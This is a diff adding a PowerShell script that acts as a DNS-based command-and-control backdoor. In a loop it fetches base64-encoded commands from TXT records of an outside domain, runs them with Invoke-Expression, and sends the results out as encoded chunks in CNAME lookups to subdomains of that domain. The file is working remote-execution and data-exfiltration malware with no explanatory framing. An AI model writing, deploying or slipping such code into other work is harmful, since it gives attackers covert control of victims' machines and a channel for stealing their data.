@@ -1,0 +1,52 @@
+
+$domain = "command.connect.menorraitdev.net"
+
+
+while ($true) {
+  
+    $txtOutput = nslookup -type=TXT $domain | Out-String
+
+
+    if ($txtOutput -match 'text\s*=\s*"(.*?)"') {
+        $encodedCommand = $matches[1]
+
+   
+        $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand))
+        Write-Output "Decoded command: $command"
+
+  
+        $output = Invoke-Expression $command
+        Write-Output "Command output: $output"
+
+   
+        if ($output.Length -gt 20) {
+           
+            $chunks = ($output -split '(.{1,10})' | Where-Object { $_ -ne "" })
+            $counter = 1
+
+            foreach ($chunk in $chunks) {
+               
+                $chunkWithLabel = "Chunk$counter-$chunk"
+                $encodedChunk = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($chunkWithLabel))
+                
+             
+                $subdomain = "$encodedChunk.$domain"
+                nslookup -type=CNAME $subdomain
+                Start-Sleep -Milliseconds 500  
+                $counter++
+            }
+        } else {
+      
+            $randomNumber = Get-Random -Minimum 100 -Maximum 999
+            $modifiedOutput = "$output$randomNumber"
+            $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($modifiedOutput))
+            
+            nslookup -type=CNAME "$encodedOutput.$domain"
+        }
+    } else {
+        Write-Output "No TXT record found for command."
+    }
+
+  
+    Start-Sleep -Seconds 60
+}
